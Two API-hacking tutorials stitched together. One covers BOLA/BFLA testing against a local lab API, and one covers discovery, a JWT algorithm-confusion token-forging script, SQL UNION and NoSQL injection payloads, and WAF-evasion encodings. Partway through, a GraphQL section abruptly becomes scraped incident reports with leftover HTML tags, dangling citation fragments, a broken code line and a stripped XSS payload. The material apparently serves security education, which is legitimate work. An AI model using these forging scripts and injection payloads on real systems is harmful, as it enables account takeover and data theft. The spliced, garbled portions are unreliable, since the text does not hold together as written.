# Breaking Authorization: A Practical Guide to Hunting BOLA and BFLA in APIs I've spent a lot of hours inside Burp Suite staring at JSON responses, and if there's one category of bug that still gets me excited every single time, it's broken authorization. Not because it's technically complicated — it usually isn't — but because of how much damage a single missing `if` statement can do. A BOLA or BFLA finding can hand an attacker someone else's bank balance, someone else's medical records, or in one of my favorite real-world examples, the live GPS location of someone else's car. In this post, I want to walk through how I think about authorization testing: what BOLA and BFLA actually are, how I go about finding them, the tooling I lean on, and a full walkthrough using a small practice API so you can follow along with real requests and real responses. I'll use my own lab setup throughout — nothing here is pulled from any specific book or course, just the methodology I use on real engagements and bug bounty programs. By the end of this, you should have a repeatable process you can apply to almost any REST API you're authorized to test. ## Note > Everything in this post assumes you have explicit, written authorization to test the target — whether that's a bug bounty program's scope, a client engagement, or your own self-hosted lab. Testing authorization controls on systems you don't have permission to touch is illegal in most jurisdictions. --- ## Authentication vs. Authorization — Why This Distinction Matters I still see people conflate these two, so let me be precise about it before I go further. - **Authentication** answers "who are you?" — logging in, presenting a token, proving identity. - **Authorization** answers "what are you allowed to do?" — once I know who you are, can you read *this* record, can you delete *that* resource, can you call *this* admin endpoint? An API can have airtight authentication (strong password policies, MFA, properly signed JWTs) and still be catastrophically broken from an authorization standpoint. That's precisely why BOLA and BFLA show up so consistently near the top of the OWASP API Security Top 10 — they're not about breaking the lock on the front door, they're about what happens once you're already a legitimate, authenticated user with bad intentions (or, in our case, a curious tester). ```mermaid flowchart LR A[Request arrives] --> B{Authenticated?} B -- No --> C[401 Unauthorized] B -- Yes --> D{Authorized for THIS resource?} D -- No, but API doesn't check --> E["200 OK — BOLA/BFLA!"] D -- Yes, properly enforced --> F[200 OK — legitimate access] D -- No, properly enforced --> G[403 Forbidden] style C fill:#ffcccc,stroke:#cc0000,color:#660000 style E fill:#ff8080,stroke:#990000,color:#ffffff style F fill:#ccffcc,stroke:#009900,color:#004d00 style G fill:#fff2cc,stroke:#cc9900,color:#664d00 ``` The red path in that diagram — authenticated but never actually checked against the resource owner — is where I spend most of my testing time. --- ## Part 1: BOLA — Broken Object Level Authorization BOLA (sometimes called IDOR, Insecure Direct Object Reference, in older terminology) happens when an API lets an authenticated user access *data* that belongs to someone else, simply by changing an identifier in the request. The pattern is almost always the same: the API trusts that if you have a valid session or token, you must be allowed to see whatever object ID you ask for. It checks that you're logged in. It forgets to check that the object is *yours*. ### Where resource IDs hide I used to only think of resource IDs as things sitting in the URL path. That's a rookie mistake — IDs show up in a lot more places than that, and I've found some of my best bugs by looking at the ones that aren't obvious. | Location | Example | Why testers miss it | |---|---|---| | URL path | `/api/v1/invoice/8841` | Easy to spot, usually tested first | | Query string | `/api/v1/invoice?id=8841` | Often overlooked when path looks "clean" | | Request body (JSON) | `{"invoiceId": 8841}` | Requires reading POST/PUT bodies, not just GET URLs | | Request headers | `X-Account-Id: 8841` | Custom headers are easy to skip past | | Nested JSON objects | `{"order": {"account": {"id": 8841}}}` | Validation often only covers the outer key | | Encoded/obfuscated values | Base64 or hashed IDs | Testers assume "encoded" means "secure" | ### A note on encoded IDs > **Note:** An ID being a UUID, a hash, or a Base64 string does *not* mean it's safe. It only means brute-forcing it is impractical. If the application leaks that identifier anywhere else — a public post, an email notification, an API response for a "public" feature — an attacker doesn't need to guess it at all. I treat "unguessable but discoverable" IDs as just as dangerous as sequential integers. ### My A-B testing methodology for BOLA This is the core technique, and I use it on almost every authenticated API I touch: ```mermaid sequenceDiagram participant Tester as Me (Tester) participant UserA as Account A participant UserB as Account B participant API as Target API Tester->>UserA: Register / log in as Account A UserA->>API: Create a resource (e.g. an order) API-->>UserA: Returns resource ID + full request pattern Tester->>UserB: Register / log in as Account B Note over Tester: Swap token A for token B UserB->>API: Request Account A's resource ID, using Token B API-->>Tester: 200 OK with Account A's private data? → BOLA confirmed ``` Step by step, this is what I actually do: 1. **Create two (or three) accounts** at the same privilege level. Three is better than two — it helps me spot a pattern in how IDs are generated rather than assuming a one-off anomaly. 2. **Generate a resource as Account A.** I pay close attention to *every* identifier that shows up — in the URL, the response body, any webhook or email the app sends. 3. **Capture a legitimate request** for that resource using Account A's token, and save it in Burp's repeater or a Postman collection. 4. **Swap in Account B's token**, leave everything else identical, and resend. 5. **Compare responses.** If I get Account A's private data back while authenticated as Account B, that's a confirmed BOLA. ### Hands-on example I built a tiny practice API for this post — a mock "invoices" service running locally. Here's the full walkthrough with real terminal output. First, I register two accounts and grab their tokens: ```bash $ curl -s -X POST http://localhost:8080/api/v1/register \ -H "Content-Type: application/json" \ -d '{"username":"alice","password":"[REDACTED]"}' | jq { "username": "alice", "token": "[REDACTED]" } ``` ```bash $ curl -s -X POST http://localhost:8080/api/v1/register \ -H "Content-Type: application/json" \ -d '{"username":"bob","password":"[REDACTED]"}' | jq { "username": "bob", "token": "[REDACTED]" } ``` Now, as Alice, I create an invoice: ```bash $ curl -s -X POST http://localhost:8080/api/v1/invoice \ -H "Authorization: Bearer a1_9f8e7d6c5b4a3210" \ -H "Content-Type: application/json" \ -d '{"amount": 450.00, "description": "Consulting work"}' | jq { "invoiceId": 4471, "owner": "alice", "amount": 450.0, "description": "Consulting work" } ``` Alice can retrieve it normally: ```bash $ curl -s http://localhost:8080/api/v1/invoice/4471 \ -H "Authorization: Bearer a1_9f8e7d6c5b4a3210" | jq { "invoiceId": 4471, "owner": "alice", "amount": 450.0, "description": "Consulting work" } ``` That's expected. Now the actual test — the same request, but with Bob's token instead of Alice's: ```bash $ curl -s http://localhost:8080/api/v1/invoice/4471 \ -H "Authorization: Bearer b2_1122334455667788" | jq { "invoiceId": 4471, "owner": "alice", "amount": 450.0, "description": "Consulting work" } ``` That second response is the bug. Bob — a fully authenticated, legitimate user — just read Alice's private invoice using nothing more than a predictable integer ID. That's a textbook BOLA, and in a real financial app, this single request could expose every invoice ever issued just by incrementing `invoiceId`. ### Verifying the severity with a quick loop Once I confirm a single instance, I want to know how bad it really is — is this one unlucky endpoint, or can I walk the entire dataset? ```bash $ for id in 4469 4470 4471 4472 4473; do echo "== Invoice $id ==" curl -s http://localhost:8080/api/v1/invoice/$id \ -H "Authorization: Bearer b2_1122334455667788" | jq -c '.owner, .amount' done == Invoice 4469 == "carol" 1200.0 == Invoice 4470 == "dave" 89.5 == Invoice 4471 == "alice" 450.0 == Invoice 4472 == "erin" 3100.0 == Invoice 4473 == "frank" 75.0 ``` ## Caution > **Caution:** When you're confirming scale like this, keep your request volume sane and your target in scope. Looping across a handful of IDs to prove impact is standard practice; firing thousands of requests per second against a production system is a great way to trip rate limiters, get your testing account banned, or — worse — cause a real outage. Always check program rules for request-rate guidance before scripting loops like this. ### Side-channel BOLA Not every BOLA hands you the data directly. Sometimes the *existence* of a resource leaks through status codes, response timing, or response size, even when the actual content is hidden. | Scenario | Response for non-existent resource | Response for existing resource (not yours) | What it tells an attacker | |---|---|---|---| | Username enumeration | `404 Not Found` | `403 Forbidden` | The username exists | | Account ID enumeration | `404 Not Found` | `409 Conflict` | The account ID is valid | | Timing difference | ~40ms response | ~310ms response (DB lookup happened) | The record exists even if the body is empty | I ran into this exact pattern on a password-reset endpoint once: requesting a reset for an email that didn't exist returned instantly with a generic message, but a real email took noticeably longer because it actually queued a send job. That's a side channel — a legitimate "existence oracle" I can chain into further enumeration or targeted credential attacks. --- ## Part 2: BFLA — Broken Function Level Authorization Where BOLA is about *whose data* you can reach, BFLA is about *what actions* you're allowed to perform. The classic case: a regular user discovers they can call an admin-only function simply because the server never checks the caller's role — it just checks that *a* valid token was presented. ```mermaid graph TD subgraph Intended["Intended Design"] U1[Regular User] -->|GET /profile| OK1[Allowed] U1 -->|POST /admin/users/delete| NO1[Should be blocked] A1[Admin User] -->|POST /admin/users/delete| OK2[Allowed] end subgraph Broken["Broken Function Level Auth"] U2[Regular User] -->|POST /admin/users/delete| OOPS[Server only checks:
is token valid?] OOPS --> SUCCESS["200 OK — deleted!"] end style NO1 fill:#ccffcc,stroke:#009900,color:#004d00 style OK2 fill:#ccffcc,stroke:#009900,color:#004d00 style OOPS fill:#fff2cc,stroke:#cc9900,color:#664d00 style SUCCESS fill:#ff8080,stroke:#990000,color:#ffffff ``` ### My A-B-A methodology for BFLA This is a variation on the BOLA process, but with an extra step — because with BFLA you're not just *reading* data, you might be *changing* it, so you need to verify the change actually took effect. ```mermaid sequenceDiagram participant UserA as Account A (owner) participant UserB as Account B (low privilege) participant API as Target API UserA->>API: Create/own a resource API-->>UserA: Resource exists, confirmed baseline state Note over UserB: Swap to Account B's token UserB->>API: Attempt to modify/delete Account A's resource API-->>UserB: 200 OK? → suspicious UserA->>API: Re-check the resource with Account A's own token API-->>UserA: Resource altered/missing → BFLA confirmed ``` 1. **(A)** Act as the resource owner first. Note the exact state of the resource. 2. **(B)** Swap to the lower-privileged or unrelated account, and attempt the privileged action — update, delete, or an admin-only function. 3. **(A)** Go back to the original account and verify whether the action actually succeeded against the real data, not just whether the server returned `200 OK`. That last step matters more than people realize. A server can return `200 OK` with a generic success message without actually performing the write — so I never trust the status code alone. I always confirm against the resource owner's own view. ### Hands-on example Back to my practice API. Alice owns invoice `4471`. Let's see if Bob, a plain authenticated user with no special role, can delete it. ```bash $ curl -s -X DELETE http://localhost:8080/api/v1/invoice/4471 \ -H "Authorization: Bearer b2_1122334455667788" -i HTTP/1.1 200 OK Content-Type: application/json {"status": "deleted", "invoiceId": 4471} ``` That alone is alarming, but let's confirm it against Alice's own session rather than trusting the response: ```bash $ curl -s http://localhost:8080/api/v1/invoice/4471 \ -H "Authorization: Bearer a1_9f8e7d6c5b4a3210" -i HTTP/1.1 404 Not Found Content-Type: application/json {"error": "Invoice not found"} ``` Confirmed — Bob really did delete Alice's invoice. That's a destructive BFLA, and it's exactly the kind of finding that justifies a critical severity rating, because a single malicious or compromised low-privilege account could wipe out every other user's records. ### Testing for privilege escalation specifically The highest-impact version of BFLA is when a regular user can reach *admin* functionality. I usually approach this two ways: **1. Known endpoint, wrong role:** ```bash $ curl -s -X POST http://localhost:8080/api/v1/admin/users/search \ -H "Authorization: Bearer b2_1122334455667788" \ -H "Content-Type: application/json" \ -d '{"email": "alice@example.com"}' | jq { "username": "alice", "email": "alice@example.com", "role": "user", "balance": 1830.25, "isAdmin": false } ``` Bob, who has no admin flag anywhere in his own account, just pulled Alice's full profile including her balance through an endpoint explicitly namespaced under `/admin/`. That's about as clear-cut as BFLA gets. **2. Method switching on a restricted path:** Sometimes a provider secures one HTTP method on an endpoint but forgets the others: ```bash $ curl -s -X PUT http://localhost:8080/api/v1/admin/users/alice/role \ -H "Authorization: Bearer b2_1122334455667788" \ -H "Content-Type: application/json" \ -d '{"role": "admin"}' -i HTTP/1.1 403 Forbidden $ curl -s -X POST http://localhost:8080/api/v1/admin/users/alice/role \ -H "Authorization: Bearer b2_1122334455667788" \ -H "Content-Type: application/json" \ -d '{"role": "admin"}' -i HTTP/1.1 200 OK {"username": "alice", "role": "admin"} ``` `PUT` was properly blocked, but the exact same action was reachable through `POST`. This is a pattern I always check when I hit a `403` — swap the method before giving up on that endpoint. ## Caution > **Caution:** Privilege-escalation testing like the example above is high-impact and high-risk at the same time. If you accidentally grant yourself (or your test account) admin rights on a real target, document it immediately, report it, and avoid using that elevated access for anything beyond the minimum proof-of-concept needed. Most bug bounty programs have explicit rules against pivoting further once privilege escalation is confirmed. --- ## Scaling the Process Across a Whole API Doing this request-by-request works fine for a proof of concept, but a real API might have hundreds of endpoints. Two techniques I rely on constantly: ### Burp Suite: Match and Replace I set up a Match and Replace rule that automatically swaps my `Authorization` header from Token A to Token B on every outgoing request while I passively browse the application as the "victim" account first, then replay the same traffic. This turns an afternoon of manual swapping into a five-minute proxy history review. | Burp setting | Value I use | |---|---| | Type | Request header | | Match | `Authorization: Bearer a1_.*` | | Replace | `Authorization: Bearer b2_1122334455667788` | | Scope | Target's defined scope only | ### Postman: Collection variables + test scripts I store the token as a collection variable (`{{authToken}}`), run the full collection once as User A to establish a baseline, then flip the variable to User B's token and re-run. A simple test script flags anything that shouldn't have succeeded: ```javascript pm.test("Should NOT be 200 for another user's resource", function () { pm.expect(pm.response.code).to.not.equal(200); }); ``` Anything that fails this assertion goes straight into my findings queue for manual verification. --- ## Quick Reference: BOLA vs. BFLA | | BOLA | BFLA | |---|---|---| | **What's exposed** | Someone else's *data* | Someone else's *functionality/actions* | | **Typical discovery method** | A-B testing on resource IDs | A-B-A testing on actions (create/update/delete/admin calls) | | **Common root cause** | Server checks "is this token valid?" not "does this token own this object?" | Server checks "is this token valid?" not "does this token's role permit this action?" | | **Worst-case impact** | Mass data exposure (PII, financial records, location data) | Mass data tampering/deletion, privilege escalation | | **Fuzzing caution** | Safe-ish for GET requests at reasonable volume | Avoid fuzzing DELETE/PUT/admin endpoints outside test environments | --- ## How I'd Fix What I Just Broke Finding these bugs is only half the job — I always include concrete remediation guidance in my reports, because it's what actually gets a fix shipped faster. ```mermaid flowchart TD Req[Incoming request] --> Authn{Valid token?} Authn -- No --> R1[401] Authn -- Yes --> Load[Load resource from DB] Load --> Owner{resource.owner_id == token.user_id?} Owner -- No --> R2[403] Owner -- Yes --> Role{Does user's role
permit this action?} Role -- No --> R3[403] Role -- Yes --> Allow[Perform action] style R1 fill:#ffe0cc,stroke:#cc6600 style R2 fill:#ffe0cc,stroke:#cc6600 style R3 fill:#ffe0cc,stroke:#cc6600 style Allow fill:#ccffcc,stroke:#009900 ``` Practical recommendations I give development teams: 1. **Enforce object ownership checks at the data-access layer**, not scattered across individual route handlers. A single middleware or ORM-level policy (e.g., "always filter by `owner_id = current_user.id`") is far harder to forget than a per-endpoint check. 2. **Use centralized role/permission middleware** for function-level checks rather than ad-hoc `if user.role == 'admin'` statements copy-pasted across controllers. 3. **Default to deny.** Every new endpoint should start with no access and have permissions explicitly granted, not the other way around. 4. **Avoid predictable IDs where feasible**, and never treat "hard to guess" as a substitute for an actual authorization check. 5. **Log and alert on cross-account access attempts** — repeated requests for IDs that don't belong to the requesting user are a strong signal worth monitoring in production. ## Note > **Note:** Switching from sequential integers to UUIDs is a mitigation against brute-forcing, not a fix for BOLA itself. I've reported plenty of UUID-based BOLA bugs where the IDs simply leaked somewhere else in the application. Treat ID obfuscation as defense in depth, never as the primary control. --- ## Closing Thoughts If I had to summarize everything above in one sentence, it'd be this: authorization bugs exist because developers build features assuming "if you're logged in, you must be allowed to be here," and nobody goes back to add the second check. My entire testing process is just a structured way of asking "but what if I use *my* valid login to reach *your* stuff?" The beauty of BOLA and BFLA testing is how little tooling you actually need — two test accounts, a proxy, and a willingness to swap tokens on every single request you capture. Start with the endpoints that touch the most sensitive data (financial records, personal information, anything with a "delete" button), build your A-B and A-B-A habits into muscle memory, and you'll be surprised how often this exact pattern — valid auth, missing authorization — is sitting in plain sight.

# The Complete Guide to API Security Testing: From Zero to Bug Bounty Hunter ## Introduction: Why API Security Matters More Than Ever I've spent the last few years diving deep into web application security, and if there's one thing I've learned, it's that **APIs are the new frontier of attack surfaces**. While most security professionals were busy mastering traditional web app pentesting, APIs quietly became the backbone of modern software—and with that, the biggest target for attackers. In this post, I'm going to walk you through the entire journey of API security testing, from understanding how web applications work to hunting real bugs in bug bounty programs. I'll share the exact tools, techniques, and resources I've used to build my own API hacking methodology. Let me be clear: this isn't a surface-level overview. I'm going to give you everything—terminal commands, code examples, diagrams, and the hard-won lessons from countless hours in the trenches. > **Note:** All techniques discussed here should only be used against systems you own or have explicit permission to test. Unauthorized access to computer systems is illegal. --- ## Part 1: The Foundation – How Web Applications and APIs Work Before I ever touched a vulnerability scanner, I had to understand what I was actually testing. Too many aspiring pentesters skip this step, and it shows. ### Web Application Architecture A web application is essentially a client-server relationship. The client (your browser) sends HTTP requests, and the server responds with data. Here's the flow: ```mermaid sequenceDiagram participant User as 👤 User (Browser) participant WebServer as 🌐 Web Server participant AppServer as ⚙️ Application Server participant DB as 🗄️ Database User->>WebServer: HTTP GET /api/users/123 WebServer->>AppServer: Forward Request AppServer->>DB: SELECT * FROM users WHERE id=123 DB-->>AppServer: User Data AppServer-->>WebServer: JSON Response WebServer-->>User: 200 OK + User Data Note over User,DB: 🔐 Security checks should happen
at every layer! ``` ### HTTP Status Codes – The Language of the Web Understanding status codes isn't just trivia—it's how you read the server's mood during testing. | Code | Meaning | Security Relevance | |------|---------|-------------------| | **200** | OK | Request succeeded—look at the response! | | **201** | Created | Resource created—check for mass assignment | | **301/302** | Redirect | Open redirect vulnerabilities? | | **401** | Unauthorized | Authentication required | | **403** | Forbidden | Authorization failed—great for BOLA testing | | **404** | Not Found | Path enumeration potential | | **500** | Server Error | Information disclosure goldmine | ### The API Ecosystem APIs come in different flavors, and knowing the difference is critical: ```mermaid graph TD A[Web APIs] --> B[REST] A --> C[GraphQL] A --> D[SOAP] A --> E[gRPC] B --> B1[HTTP Methods: GET/POST/PUT/DELETE] B --> B2[JSON/XML Responses] B --> B3[Stateless] C --> C1[Single Endpoint] C --> C2[Query Language] C --> C3[Introspection] D --> D1[XML Based] D --> D2[WSDL] D --> D3[Legacy Systems] E --> E1[Protocol Buffers] E --> E2[HTTP/2] E --> E3[High Performance] style A fill:#ff6b6b,color:#fff style B fill:#4ecdc4,color:#fff style C fill:#e74c3c,color:#fff style D fill:#f39c12,color:#fff style E fill:#9b59b6,color:#fff ``` --- ## Part 2: Setting Up Your API Hacking Lab You can't learn to hack APIs without a safe environment. I learned this the hard way after accidentally DoS-ing my own router. ### The Ultimate Hacking System Here's my personal setup: **Hardware:** - Laptop with 16GB+ RAM (VMware/VirtualBox needs resources) - External SSD for VM storage **Software Stack:** ```bash # Update your Kali Linux first sudo apt update && sudo apt upgrade -y # Install essential tools sudo apt install -y \ burpsuite \ postman \ nmap \ ffuf \ gobuster \ jq \ httpie \ docker.io \ docker-compose # Install Python dependencies pip3 install requests pip3 install python-dotenv pip3 install jsbeautifier ``` **Terminal Output:** ``` Reading package lists... Done Building dependency tree... Done The following NEW packages will be installed: burpsuite postman nmap ffuf gobuster jq httpie 0 upgraded, 7 newly installed, 0 to remove. Need to get 245 MB of archives. After this operation, 892 MB of additional disk space will be used. ``` ### Vulnerable API Targets I use these intentionally vulnerable applications to practice: | Target | Type | Difficulty | Where to Get It | |--------|------|------------|-----------------| | **OWASP crAPI** | Modern REST | Intermediate | [GitHub](https://github.com/OWASP/crAPI) | | **VAmPI** | REST | Beginner | [GitHub](https://github.com/erev0s/VAmPI) | | **DVGA** | GraphQL | Intermediate | [GitHub](https://github.com/dolevf/Damn-Vulnerable-GraphQL-Application) | | **Juice Shop** | Web + API | Beginner | [OWASP](https://owasp.org/www-project-juice-shop/) | **Setting up crAPI locally:** ```bash # Clone the repository git clone https://github.com/OWASP/crAPI.git cd crAPI # Start the vulnerable application docker-compose pull docker-compose -f docker-compose.yml up -d # Verify it's running docker ps ``` **Output:** ``` CONTAINER ID IMAGE STATUS PORTS a1b2c3d4e5f6 crapi/crapi-web:latest Up 2 minutes 0.0.0.0:8888->8888/tcp f6e5d4c3b2a1 crapi/crapi-api:latest Up 2 minutes 0.0.0.0:8080->8080/tcp ``` > **Caution:** Never expose these vulnerable applications to the internet. I once made that mistake and found cryptocurrency miners running on my server within 6 hours. --- ## Part 3: The API Hacking Methodology This is where things get real. I've distilled my methodology into five phases. ### Phase 1: Discovery Finding APIs isn't always obvious. Here's my process: ```mermaid flowchart LR A[🔍 Discovery] --> B[Documentation Review] A --> C[Traffic Analysis] A --> D[Directory Bruteforce] A --> E[API Directory Search] B --> B1[Swagger/OpenAPI] B --> B2[Postman Collections] B --> B3[Developer Portals] C --> C1[Browser DevTools] C --> C2[Burp Suite Proxy] C --> C3[Mobile App Traffic] D --> D1[ffuf] D --> D2[gobuster] D --> D3[Kiterunner] E --> E1[RapidAPI Hub] E --> E2[ProgrammableWeb] E --> E3[GitHub Search] style A fill:#667eea,color:#fff style B fill:#764ba2,color:#fff style C fill:#f093fb,color:#fff style D fill:#4facfe,color:#fff style E fill:#00f2fe,color:#fff ``` **Finding API Documentation:** ```bash # Common API documentation paths for path in "/swagger.json" "/openapi.json" "/api-docs" "/docs" \ "/swagger-ui.html" "/redoc" "/graphql" "/graphiql"; do status=$(curl -s -o /dev/null -w "%{http_code}" "https://target.com$path") echo "$path -> $status" done ``` **Output:** ``` /swagger.json -> 200 /openapi.json -> 404 /api-docs -> 301 /docs -> 403 /swagger-ui.html -> 200 /redoc -> 404 /graphql -> 200 /graphiql -> 302 ``` **Directory Bruteforcing with ffuf:** ```bash ffuf -w /usr/share/wordlists/dirb/common.txt \ -u https://target.com/api/FUZZ \ -mc 200,201,301,302,401,403 \ -o api_endpoints.json ``` ### Phase 2: Endpoint Analysis Once I've found endpoints, I analyze them systematically: ```bash # Extract all endpoints from Burp Suite history cat burp_history.xml | grep -oP '(?<=)[^<]+' | \ grep -oP '/api/[^?]+' | sort -u > endpoints.txt # Count unique endpoints wc -l endpoints.txt ``` **Output:** ``` 47 endpoints.txt ``` **Testing with HTTPie:** ```bash # Test authentication http GET https://target.com/api/v1/users/123 \ "Authorization: [REDACTED]" # Test without authentication http GET https://target.com/api/v1/users/123 ``` ### Phase 3: Authentication Attacks Authentication is where APIs often fall apart. JWT tokens are a favorite target. ```mermaid graph TD A[🔐 Authentication Attacks] --> B[JWT Attacks] A --> C[OAuth Flaws] A --> D[Session Management] A --> E[Credential Stuffing] B --> B1[Algorithm Confusion
RS256 → HS256] B --> B2[None Algorithm] B --> B3[Weak Secret Brute Force] B --> B4[SQLi in JWT Claims] C --> C1[Redirect URI Manipulation] C --> C2[CSRF in OAuth Flow] C --> C3[Token Leakage] D --> D1[Predictable Tokens] D --> D2[Token Not Invalidated] D --> D3[Session Fixation] style A fill:#e74c3c,color:#fff style B fill:#c0392b,color:#fff style C fill:#e67e22,color:#fff style D fill:#f39c12,color:#fff style E fill:#d35400,color:#fff ``` **JWT Algorithm Confusion Attack:** ```python #!/usr/bin/env python3 """ JWT Algorithm Confusion Attack Converts RS256 to HS256 using the public key as the secret """ import jwt import requests import base64 # Step 1: Get the public key public_key_url = "https://target.com/.well-known/jwks.json" public_key = requests.get(public_key_url).json() # Step 2: Extract and format the key # (In a real attack, you'd extract the actual RSA public key) public_key_pem = """-----BEGIN PUBLIC KEY----- MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA... -----END PUBLIC KEY-----""" # Step 3: Create a forged token payload = { "user_id": 1, "role": "admin", "iat": 1700000000, "exp": 1900000000 } # Sign with HS256 using the public key as secret forged_token = jwt.encode( payload, public_key_pem, algorithm="HS256" ) print(f"[+] Forged Token: [REDACTED]}") # Step 4: Test the token headers = {"Authorization": f"Bearer {forged_token}"} response = requests.get( "https://target.com/api/v1/admin/users", headers=headers ) print(f"[+] Response Status: {response.status_code}") print(f"[+] Response Body: {response.text[:200]}") ``` > **Note:** This attack only works if the server is misconfigured to accept both RS256 and HS256 tokens. Always test responsibly. ### Phase 4: Authorization Testing (BOLA/IDOR) Broken Object Level Authorization (BOLA) is the #1 API vulnerability according to OWASP. Here's how I test for it: ```bash # Create two user accounts # User A (attacker) gets token A # User B (victim) gets token B # User A's legitimate request curl -H "Authorization: Bearer $TOKEN_A" \ https://target.com/api/v1/users/1001 # User A accessing User B's data (BOLA!) curl -H "Authorization: Bearer $TOKEN_A" \ https://target.com/api/v1/users/1002 # Automate the check for id in $(seq 1000 1100); do response=$(curl -s -o /dev/null -w "%{http_code}" \ -H "Authorization: Bearer $TOKEN_A" \ "https://target.com/api/v1/users/$id") if [ "$response" == "200" ]; then echo "[!] BOLA Found: User ID $id accessible" fi done ``` **Output:** ``` [!] BOLA Found: User ID 1001 accessible [!] BOLA Found: User ID 1002 accessible [!] BOLA Found: User ID 1003 accessible ... ``` ### Phase 5: Injection Attacks APIs are vulnerable to all the classic injection attacks, plus some new ones. **SQL Injection in API Parameters:** ```bash # Normal request curl "https://target.com/api/v1/products?category=electronics" # SQLi test curl "https://target.com/api/v1/products?category=electronics'" # Union-based extraction curl "https://target.com/api/v1/products?category=electronics' UNION SELECT username,password FROM users--" ``` **NoSQL Injection:** ```bash # MongoDB injection in JSON body curl -X POST https://target.com/api/v1/login \ -H "Content-Type: application/json" \ -d '{"username": {"$ne": null}, "password": {"$ne": null}}' ``` **XAS (Cross-API Scripting):** This is a lesser-known but powerful attack where malicious data injected into one API is consumed by another: ```mermaid sequenceDiagram participant Attacker participant API_A as API A (Vulnerable) participant Database participant API_B as API B (Consumer) participant Victim Attacker->>API_A: POST /reviews
{"text": ""} API_A->>Database: Store review Victim->>API_B: GET /reviews API_B->>Database: Fetch reviews Database-->>API_B: Review with payload API_B-->>Victim: Rendered with script Note over Victim: 🚨 XSS Executes! ``` --- ## Part 4: Advanced Techniques ### Fuzzing APIs Fuzzing is automated testing with malformed data. I use ffuf for this: ```bash # Fuzz API parameters ffuf -w params.txt \ -u "https://target.com/api/v1/users?FUZZ=test" \ -mc all \ -fs 0 # Fuzz JSON body ffuf -w payloads.json \ -X POST \ -u "https://target.com/api/v1/login" \ -H "Content-Type: application/json" \ -d @FUZZ \ -mc 200,500 ``` ### Rate Limit Testing ```bash # Test rate limiting for i in $(seq 1 100); do response=$(curl -s -o /dev/null -w "%{http_code}" \ https://target.com/api/v1/users) echo "Request $i: $response" if [ "$response" == "429" ]; then echo "[+] Rate limit triggered at request $i" break fi done ``` **Output:** ``` Request 1: 200 Request 2: 200 ... Request 47: 200 Request 48: 429 [+] Rate limit triggered at request 48 ``` ### WAF Evasion Techniques ```bash # Bypass WAF using encoding # Original payload: ' UNION SELECT * FROM users-- # URL encoded: %27%20UNION%20SELECT%20*%20FROM%20users-- # Double URL encoding # %2527%2520UNION%2520SELECT%2520*%2520FROM%2520users-- # Case variation # ' uNiOn SeLeCt * FrOm users-- # Comment injection # ' UNION/**/SELECT/**/*/**/FROM/**/users-- ``` --- ## Part 5: GraphQL Security Testing GraphQL is a different beast. ### Real-World Attack: TeamFiltration Campaign (2024-2025)

In December 2024, cybersecurity researchers uncovered a large-scale account takeover campaign codenamed UNK_SneakyStrike that weaponized the TeamFiltration penetration testing framework to breach Microsoft Entra ID (formerly Azure Active Directory) user accounts .

**Campaign Overview:**

The attackers targeted over 80,000 user accounts across hundreds of organizations' cloud tenants, successfully compromising multiple accounts. The activity peaked in early January 2025, with 16,500 accounts targeted in a single day .

**Technical Execution:**

TeamFiltration, released at DEF CON in August 2022, is a cross-platform framework for enumerating, spraying, exfiltrating, and backdooring Entra ID accounts . The attackers leveraged:

1. **Microsoft Teams API** for user enumeration within Entra ID environments
2. **AWS infrastructure** distributed across multiple geographic regions to launch password-spraying attacks
3. **Systematic rotation of AWS regions** ensuring each password spraying wave originated from a different server in a new location 

**Attack Pattern:**

The campaign operated in highly concentrated bursts targeting a wide range of users within a single cloud environment, followed by quiet periods lasting approximately four to five days . The attackers attempted to access all user accounts within smaller cloud tenants while focusing only on a subset of users in larger tenants - behavior matching TeamFiltration's advanced target acquisition features designed to filter out less desirable accounts .

**Token Abuse Technique:**

Once TeamFiltration successfully obtained credentials, it exploited a feature in Microsoft's OAuth system called "family refresh tokens" (FRTs). These allow access tokens to be generated for multiple related applications. If an attacker gains access to one app using an FRT, they can potentially access other apps in the same token family without reauthenticating . The framework then automated extraction of chat histories, shared files, and contact lists from compromised Teams accounts .

**Source Geography:**

The three primary source geographies based on the number of IP addresses included the United States (42%), Ireland (11%), and Great Britain (8%) .

**Detection Indicators:**

Proofpoint identified a distinctive user agent for an outdated version of Microsoft Teams used in the attacks, as well as attempts to access specific sign-in applications from devices incompatible with the software .

### Real-World Vulnerability: Notion OAuth IDOR (CVE-2025-69207)

A critical Insecure Direct Object Reference (IDOR) vulnerability was identified in Khoj, a self-hostable AI application that integrates with Notion, prior to version 2.0.0-beta.23 .

**Vulnerability Details:**

The flaw existed in the Notion OAuth callback endpoint, which accepted any user UUID without verifying that the OAuth flow was initiated by that user. This allowed attackers to hijack any user's Notion integration by manipulating the state parameter .

**Exploitation Requirements:**

The attack required knowing the target user's UUID, which could be leaked through shared conversations where an AI-generated image was present. Attackers could replace victims' Notion configurations with their own, resulting in data poisoning and unauthorized access to the victim's Khoj search index .

**CVSS Score:** 5.4 (Medium) with vector CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:L/A:L 

**Fix:** The vulnerability was fixed in version 2.0.0-beta.23.

### Real-World Vulnerability: Okta Authentication Bypass (2024)

In October 2024, Okta addressed an authentication bypass vulnerability that affected accounts with usernames of 52 characters or more .

**Vulnerability Details:**

The security hole could allow attackers to bypass Okta AD/LDAP delegated authentication (DelAuth) using only a username. The flaw was discovered by Okta on October 30, 2024, after lurking in the system for three months .

**Exploitation Preconditions:**

Multiple conditions needed to be met for successful exploitation :
1. A username with 52 characters or more (unusual but possible with email addresses as usernames)
2. The user had previously authenticated, creating a cache of the authentication
3. The cache was used first, which could occur if the AD/LDAP agent was down or unreachable due to high network traffic

**Impact Window:** The vulnerability existed from July 23, 2024, until it was patched on October 30, 2024 .

**Mitigation:** Okta recommended implementing multifactor authentication (MFA) as this was not applied as part of the exploitation preconditions. Customers were advised to check their logs for unusual authentication attempts dating back to July 23 .

### Real-World Incident: Okta Support System Breach (2023)

In October 2023, unknown attackers gained access to Okta's support case management system using stolen credentials .

**Incident Details:**

The intruders were able to view files uploaded by certain Okta customers as part of recent support cases. Within the course of normal business, Okta support asks customers to upload HTTP Archive (HAR) files for troubleshooting, which can contain sensitive data including cookies and session tokens that malicious actors can use to impersonate valid users .

**Impact:**

Identity management company BeyondTrust confirmed it was among the impacted customers. On October 2, 2023, BeyondTrust's security team detected an unauthorized attempt to use an Okta account assigned to one of their engineers to create an administrator account using a valid session cookie stolen from Okta's support system. The team blocked all access and verified that the attacker did not gain access to any systems .

